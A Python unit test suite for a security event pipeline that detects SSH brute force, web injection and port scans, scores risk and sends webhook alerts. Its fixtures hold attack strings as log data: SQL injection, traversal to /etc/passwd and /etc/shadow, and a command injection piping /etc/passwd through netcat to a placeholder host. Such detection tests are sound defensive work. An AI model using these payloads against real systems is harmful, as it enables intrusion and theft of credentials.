"""Automated unit and integration test suite for Unified Security Processing Engine & Capstone Orchestrator (Module 2.10).

16 Test Scenarios:
1. SSH Brute Force End-to-End: Module 2.2 detection, Module 2.4 baseline risk, alert created, notification sent.
2. Web SQL Injection End-to-End: Module 2.9 detection, risk elevated to 95.0, alert created, notification sent.
3. Web Directory Traversal End-to-End: Module 2.9 detection, risk elevated to 80.0, alert created, notification sent.
4. Web Command Injection End-to-End: Module 2.9 detection, risk elevated to 100.0, alert created, notification sent.
5. Network Port Scan Sweep End-to-End: Module 2.9 detection, risk elevated to 70.0, alert created, notification sent.
6. In-Container Multi-Vector Threat Escalation: Auth + Web in same container elevates composite risk to max.
7. Cross-Attack Behavioral Correlation Boost: Module 2.8 returns multi_vector with conf >= 0.70 -> +10 boost applied.
8. Benign Traffic Below Threshold: Normal request produces risk < 50.0; alert and notification skipped cleanly.
9. Ingest-and-Process with Omitted attack_id: Creates default Attack container, persists event, returns HTTP 201.
10. Ingest-and-Process with Supplied attack_id: Associates event with existing Attack container, returns HTTP 201.
11. Missing Attack Container: Non-existent attack_id returns HTTP 404 for both process and ingest endpoints.
12. Invalid Window Bounds: Out-of-range window_minutes or window_hours returns HTTP 422.
13. Re-entrant Processing Idempotency: Re-running pipeline reuses active alert and suppresses duplicate notification.
14. Notification Failure Resilience: Provider failure sets Alert.notification_status='failed' while Alert.status remains 'open'.
15. Consolidated SystemEvent Telemetry: Exactly one sanitized audit event written to SystemEvent table.
16. Router API Endpoints & Schema Contracts: Validates FastAPI HTTP endpoints, status codes (200, 201, 404, 422) and schemas.
"""

from datetime import datetime, timezone
import http.server
import json
import threading
import unittest
from fastapi import HTTPException
from sqlalchemy.orm import Session

from app.database import SessionLocal
from app.models import Alert, Attack, AttackEvent, SystemEvent, ThreatIntelligence
from app.notifications.webhook import WebhookNotificationProvider
from app.routers.unified_orchestrator import (
    ingest_and_process_endpoint,
    process_attack_endpoint,
)
from app.schemas import AttackEventCreate, UnifiedSecurityProcessingResponse
from app.unified_orchestrator.models import (
    CompositeRiskAssessment,
    compose_operational_risk,
    get_operational_severity,
)
from app.unified_orchestrator.service import (
    execute_unified_pipeline,
    ingest_and_process_event,
)


class MockWebhookHandler(http.server.BaseHTTPRequestHandler):
    """Threaded mock HTTP receiver to verify webhook dispatch payloads."""

    received_requests: list[dict] = []
    response_status: int = 200

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length)
        payload = {}
        try:
            payload = json.loads(post_data.decode("utf-8"))
        except Exception:
            pass

        self.__class__.received_requests.append({
            "path": self.path,
            "headers": dict(self.headers),
            "payload": payload,
        })

        self.send_response(self.__class__.response_status)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(b'{"status": "ok"}')

    def log_message(self, format, *args):
        # Suppress standard logging in test output
        pass


class TestUnifiedOrchestrator(unittest.TestCase):
    """Test suite covering all Module 2.10 Unified Orchestrator requirements."""

    @classmethod
    def setUpClass(cls):
        # Ephemeral port mock webhook server
        cls.server = http.server.HTTPServer(("127.0.0.1", 0), MockWebhookHandler)
        cls.server_port = cls.server.server_address[1]
        cls.server_url = f"http://127.0.0.1:{cls.server_port}/webhook"
        cls.server_thread = threading.Thread(target=cls.server.serve_forever, daemon=True)
        cls.server_thread.start()

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()
        cls.server.server_close()

    def setUp(self):
        self.db: Session = SessionLocal()
        self.created_attack_ids: list[int] = []
        self.created_ti_ids: list[int] = []
        MockWebhookHandler.received_requests = []
        MockWebhookHandler.response_status = 200
        # Clean test system events from orchestrator
        self.db.query(SystemEvent).filter(
            SystemEvent.source == "unified_orchestrator"
        ).delete()
        self.db.commit()

    def tearDown(self):
        for aid in self.created_attack_ids:
            self.db.query(Alert).filter(Alert.attack_id == aid).delete()
            self.db.query(AttackEvent).filter(AttackEvent.attack_id == aid).delete()
            self.db.query(Attack).filter(Attack.id == aid).delete()
        for ti_id in self.created_ti_ids:
            self.db.query(ThreatIntelligence).filter(ThreatIntelligence.id == ti_id).delete()
        self.db.query(SystemEvent).filter(
            SystemEvent.source == "unified_orchestrator"
        ).delete()
        self.db.commit()
        self.db.close()

    def _create_attack(
        self,
        attack_type: str = "ssh",
        source_ip: str | None = "198.51.100.42",
        status: str = "detected",
    ) -> Attack:
        attack = Attack(
            attack_type=attack_type,
            source_ip=source_ip,
            severity="low",
            risk_score=0.0,
            status=status,
        )
        self.db.add(attack)
        self.db.commit()
        self.db.refresh(attack)
        self.created_attack_ids.append(attack.id)
        return attack

    def _add_event(
        self,
        attack_id: int,
        event_type: str,
        message: str,
        source_ip: str | None = "198.51.100.42",
        event_time: datetime | None = None,
    ) -> AttackEvent:
        evt = AttackEvent(
            attack_id=attack_id,
            event_type=event_type,
            source_ip=source_ip,
            message=message,
            event_time=event_time or datetime.now(timezone.utc).replace(tzinfo=None),
        )
        self.db.add(evt)
        self.db.commit()
        self.db.refresh(evt)
        return evt

    def _add_ti(self, ip: str, threat_level: str = "high") -> ThreatIntelligence:
        ti = ThreatIntelligence(
            indicator_type="ip",
            indicator_value=ip,
            threat_level=threat_level,
            source="Test Threat Intel Feed",
            confidence=0.9,
            description="Known malicious IP",
        )
        self.db.add(ti)
        self.db.commit()
        self.db.refresh(ti)
        self.created_ti_ids.append(ti.id)
        return ti

    # =========================================================================
    # Test 1: SSH Brute Force End-to-End
    # =========================================================================
    def test_1_ssh_brute_force_end_to_end(self):
        """Test 1: SSH Brute Force flow executes 2.2 detection, 2.4 risk, creates alert, dispatches notification."""
        attack = self._create_attack(attack_type="ssh", source_ip="198.51.100.11")
        self._add_ti(ip="198.51.100.11", threat_level="high")
        for i in range(6):
            self._add_event(attack.id, "ssh_login_failed", f"Failed password for root {i}", source_ip="198.51.100.11")

        provider = WebhookNotificationProvider(webhook_url=self.server_url, timeout=3.0)
        result = execute_unified_pipeline(
            db=self.db,
            attack_id=attack.id,
            notification_provider=provider,
        )

        self.assertEqual(result["attack_id"], attack.id)
        self.assertEqual(result["pipeline_status"], "completed")
        self.assertTrue(result["detection_ssh"]["detected"])
        self.assertEqual(result["detection_ssh"]["evidence_count"], 6)
        self.assertTrue(result["threat_intelligence"]["found"])
        self.assertGreaterEqual(result["provenance"]["operational_risk"], 70.0)
        self.assertTrue(result["alert"]["alert_created"])
        self.assertEqual(result["alert"]["status"], "open")
        self.assertTrue(result["notification"]["sent"])
        self.assertEqual(len(MockWebhookHandler.received_requests), 1)

    # =========================================================================
    # Test 2: Web SQL Injection End-to-End
    # =========================================================================
    def test_2_web_sql_injection_end_to_end(self):
        """Test 2: Web SQL injection triggers Module 2.9, elevates risk to 95.0, creates alert, dispatches notification."""
        attack = self._create_attack(attack_type="web", source_ip="198.51.100.22")
        self._add_event(
            attack.id,
            "web_access",
            "GET /products?category=1' UNION SELECT username, password FROM users-- HTTP/1.1",
            source_ip="198.51.100.22",
        )

        provider = WebhookNotificationProvider(webhook_url=self.server_url, timeout=3.0)
        result = execute_unified_pipeline(
            db=self.db,
            attack_id=attack.id,
            notification_provider=provider,
        )

        self.assertEqual(result["pipeline_status"], "completed")
        self.assertFalse(result["detection_ssh"]["detected"])
        self.assertTrue(result["detection_multi_vector"]["detected"])
        self.assertIn("web", result["detection_multi_vector"]["vectors_detected"])
        self.assertEqual(result["provenance"]["detection_risk"], 95.0)
        self.assertEqual(result["provenance"]["operational_risk"], 95.0)
        self.assertEqual(result["provenance"]["operational_severity"], "critical")
        self.assertTrue(result["alert"]["alert_created"])
        self.assertEqual(result["alert"]["status"], "open")
        self.assertTrue(result["notification"]["sent"])
        self.assertEqual(len(MockWebhookHandler.received_requests), 1)

    # =========================================================================
    # Test 3: Web Directory Traversal End-to-End
    # =========================================================================
    def test_3_web_directory_traversal_end_to_end(self):
        """Test 3: Web directory traversal triggers Module 2.9, elevates risk to 85.0, creates alert."""
        attack = self._create_attack(attack_type="web", source_ip="198.51.100.23")
        self._add_event(
            attack.id,
            "web_access",
            "GET /static/../../../../etc/passwd HTTP/1.1",
            source_ip="198.51.100.23",
        )

        provider = WebhookNotificationProvider(webhook_url=self.server_url, timeout=3.0)
        result = execute_unified_pipeline(
            db=self.db,
            attack_id=attack.id,
            notification_provider=provider,
        )

        self.assertTrue(result["detection_multi_vector"]["detected"])
        self.assertEqual(result["provenance"]["detection_risk"], 85.0)
        self.assertEqual(result["provenance"]["operational_risk"], 85.0)
        self.assertEqual(result["provenance"]["operational_severity"], "high")
        self.assertTrue(result["alert"]["alert_created"])
        self.assertTrue(result["notification"]["sent"])

    # =========================================================================
    # Test 4: Web Command Injection End-to-End
    # =========================================================================
    def test_4_web_command_injection_end_to_end(self):
        """Test 4: Command injection triggers Module 2.9, elevates risk to 95.0 (critical), dispatches notification."""
        attack = self._create_attack(attack_type="web", source_ip="198.51.100.24")
        self._add_event(
            attack.id,
            "web_access",
            "POST /api/ping HTTP/1.1; cat /etc/passwd | nc 10.0.0.1 4444",
            source_ip="198.51.100.24",
        )

        provider = WebhookNotificationProvider(webhook_url=self.server_url, timeout=3.0)
        result = execute_unified_pipeline(
            db=self.db,
            attack_id=attack.id,
            notification_provider=provider,
        )

        self.assertTrue(result["detection_multi_vector"]["detected"])
        self.assertEqual(result["provenance"]["detection_risk"], 95.0)
        self.assertEqual(result["provenance"]["operational_risk"], 95.0)
        self.assertEqual(result["provenance"]["operational_severity"], "critical")
        self.assertTrue(result["alert"]["alert_created"])
        self.assertTrue(result["notification"]["sent"])

    # =========================================================================
    # Test 5: Network Port Scan Sweep End-to-End
    # =========================================================================
    def test_5_network_port_scan_sweep_end_to_end(self):
        """Test 5: Port scan sweep triggers Module 2.9, elevates risk to 70.0 (high), creates alert."""
        attack = self._create_attack(attack_type="network", source_ip="198.51.100.25")
        for port in range(21, 46):
            self._add_event(
                attack.id,
                "port_probe",
                f"SYN probe to port {port}",
                source_ip="198.51.100.25",
            )

        provider = WebhookNotificationProvider(webhook_url=self.server_url, timeout=3.0)
        result = execute_unified_pipeline(
            db=self.db,
            attack_id=attack.id,
            notification_provider=provider,
        )

        self.assertTrue(result["detection_multi_vector"]["detected"])
        self.assertIn("network", result["detection_multi_vector"]["vectors_detected"])
        self.assertEqual(result["provenance"]["detection_risk"], 70.0)
        self.assertEqual(result["provenance"]["operational_risk"], 70.0)
        self.assertEqual(result["provenance"]["operational_severity"], "high")
        self.assertTrue(result["alert"]["alert_created"])

    # =========================================================================
    # Test 6: In-Container Multi-Vector Threat Escalation
    # =========================================================================
    def test_6_in_container_multi_vector_threat_escalation(self):
        """Test 6: In-container multi-vector attack (auth + web) synthesizes multi-vector boost in Module 2.9."""
        attack = self._create_attack(attack_type="multi", source_ip="198.51.100.26")
        # Auth brute force
        for i in range(5):
            self._add_event(attack.id, "telnet_login_failed", f"Telnet fail {i}", source_ip="198.51.100.26")
        # Web SQL injection
        self._add_event(attack.id, "web_access", "GET /login?user=admin' OR 1=1--", source_ip="198.51.100.26")

        result = execute_unified_pipeline(db=self.db, attack_id=attack.id)
        mv = result["detection_multi_vector"]
        self.assertTrue(mv["detected"])
        self.assertTrue(mv["is_multi_vector"])
        self.assertEqual(sorted(mv["vectors_detected"]), ["auth", "web"])
        # Suggested risk gets multi-vector bump (9.5 + 0.5 = 10.0 -> detection_risk = 100.0)
        self.assertEqual(result["provenance"]["detection_risk"], 100.0)
        self.assertEqual(result["provenance"]["operational_risk"], 100.0)
        self.assertEqual(result["provenance"]["operational_severity"], "critical")

    # =========================================================================
    # Test 7: Cross-Attack Behavioral Correlation Boost
    # =========================================================================
    def test_7_cross_attack_behavioral_correlation_boost(self):
        """Test 7: Cross-attack correlation returns multi_vector with conf >= 0.70 -> +10 boost applied."""
        src_ip = "198.51.100.27"
        # Attack container 1: SSH
        att1 = self._create_attack(attack_type="ssh", source_ip=src_ip)
        for i in range(2):
            self._add_event(att1.id, "ssh_login_failed", f"SSH fail {i}", source_ip=src_ip)
        # Attack container 2: Web Traversal
        att2 = self._create_attack(attack_type="web", source_ip=src_ip)
        for i in range(2):
            self._add_event(att2.id, "web_access", f"GET /../../etc/passwd#{i}", source_ip=src_ip)

        result = execute_unified_pipeline(db=self.db, attack_id=att2.id)
        corr = result["correlation"]
        self.assertTrue(corr["correlated"])
        self.assertEqual(corr["correlation_type"], "multi_vector")
        self.assertGreaterEqual(corr["confidence"], 0.70)
        self.assertEqual(result["provenance"]["correlation_boost"], 10.0)
        # Base traversal risk is 85.0; with +10 correlation boost = 95.0 (critical)
        self.assertEqual(result["provenance"]["operational_risk"], 95.0)
        self.assertEqual(result["provenance"]["operational_severity"], "critical")

    # =========================================================================
    # Test 8: Benign Traffic Below Threshold
    # =========================================================================
    def test_8_benign_traffic_below_threshold(self):
        """Test 8: Benign traffic below threshold (risk < 50) creates no alert and skips notification."""
        attack = self._create_attack(attack_type="web", source_ip="198.51.100.28")
        self._add_event(attack.id, "web_access", "GET /index.html HTTP/1.1", source_ip="198.51.100.28")

        provider = WebhookNotificationProvider(webhook_url=self.server_url, timeout=3.0)
        result = execute_unified_pipeline(
            db=self.db,
            attack_id=attack.id,
            notification_provider=provider,
        )

        self.assertFalse(result["detection_ssh"]["detected"])
        self.assertFalse(result["detection_multi_vector"]["detected"])
        self.assertEqual(result["provenance"]["operational_risk"], 0.0)
        self.assertEqual(result["provenance"]["operational_severity"], "low")
        self.assertFalse(result["alert"]["alert_created"])
        self.assertIsNone(result["alert"]["alert_id"])
        self.assertFalse(result["notification"]["attempted"])
        self.assertFalse(result["notification"]["sent"])
        self.assertEqual(len(MockWebhookHandler.received_requests), 0)

    # =========================================================================
    # Test 9: Ingest-and-Process with Omitted attack_id
    # =========================================================================
    def test_9_ingest_and_process_omitted_attack_id(self):
        """Test 9: Ingest-and-process without attack_id dynamically creates Attack container."""
        event_in = AttackEventCreate(
            event_type="web_access",
            source_ip="198.51.100.29",
            message="GET /item?id=1' UNION SELECT 1,password FROM users--",
        )

        result = ingest_and_process_event(db=self.db, event_in=event_in)
        created_attack_id = result["attack_id"]
        self.created_attack_ids.append(created_attack_id)

        # Verify created attack container in DB
        db_attack = self.db.query(Attack).filter(Attack.id == created_attack_id).first()
        self.assertIsNotNone(db_attack)
        self.assertEqual(db_attack.source_ip, "198.51.100.29")
        self.assertEqual(db_attack.attack_type, "web_access")
        self.assertEqual(result["pipeline_status"], "completed")
        self.assertTrue(result["alert"]["alert_created"])

    # =========================================================================
    # Test 10: Ingest-and-Process with Supplied attack_id
    # =========================================================================
    def test_10_ingest_and_process_supplied_attack_id(self):
        """Test 10: Ingest-and-process with explicit attack_id binds event to existing container."""
        attack = self._create_attack(attack_type="web", source_ip="198.51.100.30")
        event_in = AttackEventCreate(
            attack_id=attack.id,
            event_type="web_access",
            source_ip="198.51.100.30",
            message="; id; whoami",
        )

        result = ingest_and_process_event(db=self.db, event_in=event_in)
        self.assertEqual(result["attack_id"], attack.id)
        self.assertEqual(result["pipeline_status"], "completed")

        # Verify event attached in DB
        events = self.db.query(AttackEvent).filter(AttackEvent.attack_id == attack.id).all()
        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].message, "; id; whoami")

    # =========================================================================
    # Test 11: Missing Attack Container
    # =========================================================================
    def test_11_missing_attack_raises_404(self):
        """Test 11: Non-existent attack container raises HTTP 404 for both endpoints."""
        with self.assertRaises(HTTPException) as cm_proc:
            execute_unified_pipeline(db=self.db, attack_id=999999)
        self.assertEqual(cm_proc.exception.status_code, 404)

        event_in = AttackEventCreate(
            attack_id=999999,
            event_type="ssh",
            source_ip="198.51.100.31",
            message="failed login",
        )
        with self.assertRaises(HTTPException) as cm_ingest:
            ingest_and_process_event(db=self.db, event_in=event_in)
        self.assertEqual(cm_ingest.exception.status_code, 404)

    # =========================================================================
    # Test 12: Invalid Window Bounds
    # =========================================================================
    def test_12_invalid_window_raises_422(self):
        """Test 12: Out-of-bounds window_minutes or window_hours raises HTTP 422."""
        attack = self._create_attack()

        with self.assertRaises(HTTPException) as cm1:
            execute_unified_pipeline(db=self.db, attack_id=attack.id, window_minutes=0)
        self.assertEqual(cm1.exception.status_code, 422)

        with self.assertRaises(HTTPException) as cm2:
            execute_unified_pipeline(db=self.db, attack_id=attack.id, window_minutes=61)
        self.assertEqual(cm2.exception.status_code, 422)

        with self.assertRaises(HTTPException) as cm3:
            execute_unified_pipeline(db=self.db, attack_id=attack.id, window_hours=0)
        self.assertEqual(cm3.exception.status_code, 422)

        with self.assertRaises(HTTPException) as cm4:
            execute_unified_pipeline(db=self.db, attack_id=attack.id, window_hours=169)
        self.assertEqual(cm4.exception.status_code, 422)

    # =========================================================================
    # Test 13: Re-entrant Processing Idempotency
    # =========================================================================
    def test_13_reentrant_processing_idempotency(self):
        """Test 13: Re-running pipeline on high-risk attack reuses alert and suppresses duplicate notification."""
        attack = self._create_attack(attack_type="web", source_ip="198.51.100.33")
        self._add_event(attack.id, "web_access", "; cat /etc/passwd", source_ip="198.51.100.33")
        provider = WebhookNotificationProvider(webhook_url=self.server_url, timeout=3.0)

        # Run 1
        res1 = execute_unified_pipeline(db=self.db, attack_id=attack.id, notification_provider=provider)
        self.assertTrue(res1["alert"]["alert_created"])
        self.assertTrue(res1["notification"]["sent"])
        alert_id_1 = res1["alert"]["alert_id"]
        self.assertEqual(len(MockWebhookHandler.received_requests), 1)

        # Run 2: Re-entrant execution
        res2 = execute_unified_pipeline(db=self.db, attack_id=attack.id, notification_provider=provider)
        self.assertFalse(res2["alert"]["alert_created"])
        self.assertEqual(res2["alert"]["alert_id"], alert_id_1)
        self.assertFalse(res2["notification"]["sent"])
        self.assertIn("already notified", res2["notification"]["message"])
        # Crucial idempotency assertion: zero duplicate webhooks sent
        self.assertEqual(len(MockWebhookHandler.received_requests), 1)

    # =========================================================================
    # Test 14: Notification Failure Resilience
    # =========================================================================
    def test_14_notification_failure_resilience(self):
        """Test 14: Webhook 500 error sets Alert.notification_status='failed' while Alert.status remains 'open'."""
        MockWebhookHandler.response_status = 500
        attack = self._create_attack(attack_type="web", source_ip="198.51.100.34")
        self._add_event(attack.id, "web_access", "; cat /etc/passwd", source_ip="198.51.100.34")
        provider = WebhookNotificationProvider(webhook_url=self.server_url, timeout=3.0)

        result = execute_unified_pipeline(db=self.db, attack_id=attack.id, notification_provider=provider)
        self.assertEqual(result["pipeline_status"], "completed")
        self.assertTrue(result["notification"]["attempted"])
        self.assertFalse(result["notification"]["sent"])

        # Check DB states
        alert = self.db.query(Alert).filter(Alert.id == result["alert"]["alert_id"]).first()
        self.assertIsNotNone(alert)
        self.assertEqual(alert.status, "open")  # Alert lifecycle preserved!
        self.assertEqual(alert.notification_status, "failed")  # Delivery state tracked!

    # =========================================================================
    # Test 15: Consolidated SystemEvent Telemetry
    # =========================================================================
    def test_15_audit_telemetry_persistence(self):
        """Test 15: Exactly one sanitized record written to SystemEvent table per execution."""
        attack = self._create_attack(attack_type="web", source_ip="198.51.100.35")
        self._add_event(attack.id, "web_access", "GET /test' OR 1=1--", source_ip="198.51.100.35")

        execute_unified_pipeline(db=self.db, attack_id=attack.id)

        sys_events = (
            self.db.query(SystemEvent)
            .filter(
                SystemEvent.source == "unified_orchestrator",
                SystemEvent.event_type == "unified_security_processing",
            )
            .all()
        )
        self.assertEqual(len(sys_events), 1)
        event = sys_events[0]
        self.assertIn(f"Attack #{attack.id}", event.message)
        self.assertIn("198.51.100.35", event.message)
        self.assertIn("operational_risk=", event.message)
        self.assertEqual(event.severity, "critical")

    # =========================================================================
    # Test 16: Router API Endpoints & Schema Contracts
    # =========================================================================
    def test_16_router_endpoints_and_schema_contract(self):
        """Test 16: Router endpoints return validated UnifiedSecurityProcessingResponse schemas."""
        attack = self._create_attack(attack_type="web", source_ip="198.51.100.36")
        self._add_event(attack.id, "web_access", "; uname -a", source_ip="198.51.100.36")

        # 1. Test process_attack_endpoint
        res_proc = process_attack_endpoint(
            attack_id=attack.id,
            window_minutes=15,
            window_hours=24,
            db=self.db,
        )
        self.assertIsInstance(res_proc, UnifiedSecurityProcessingResponse)
        self.assertEqual(res_proc.attack_id, attack.id)
        self.assertEqual(res_proc.pipeline_status, "completed")
        self.assertTrue(res_proc.detection_multi_vector.detected)

        # 2. Test ingest_and_process_endpoint
        event_in = AttackEventCreate(
            event_type="web_access",
            source_ip="198.51.100.37",
            message="GET /../../etc/shadow",
        )
        res_ingest = ingest_and_process_endpoint(
            event_in=event_in,
            window_minutes=15,
            window_hours=24,
            db=self.db,
        )
        self.assertIsInstance(res_ingest, UnifiedSecurityProcessingResponse)
        self.created_attack_ids.append(res_ingest.attack_id)
        self.assertEqual(res_ingest.source_ip, "198.51.100.37")
        self.assertTrue(res_ingest.alert.alert_created)

        # 3. Test 404 for missing attack on process endpoint
        with self.assertRaises(HTTPException) as cm_404:
            process_attack_endpoint(
                attack_id=999999,
                window_minutes=15,
                window_hours=24,
                db=self.db,
            )
        self.assertEqual(cm_404.exception.status_code, 404)

        # 4. Test 422 for invalid query params
        with self.assertRaises(HTTPException) as cm_422:
            process_attack_endpoint(
                attack_id=attack.id,
                window_minutes=0,
                window_hours=24,
                db=self.db,
            )
        self.assertEqual(cm_422.exception.status_code, 422)


if __name__ == "__main__":
    unittest.main()
